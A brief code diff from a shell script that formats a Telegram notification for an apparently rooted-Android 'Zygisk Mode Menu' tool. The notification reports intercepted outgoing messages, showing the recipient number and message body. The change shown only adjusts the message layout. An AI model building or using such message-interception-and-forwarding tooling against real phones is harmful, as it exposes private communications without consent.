@@ -1059,11 +1059,10 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # User screenshot: bold headers + monospaced To/Body = tap-to-copy
+  # First screenshot spacing — blank lines between header / To / Body
   HTML_TO=$(tg_html_escape "$TO_NUM")
   HTML_BODY=$(tg_html_escape "$MSG_BODY")
-  TEXT="<b>Intercepted Outgoing Zygisk Mode Menu</b>
-<b>By @Hivirtus 🔥</b>
+  TEXT="📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>
 
 To (Tap to copy):
 <code>${HTML_TO}</code>
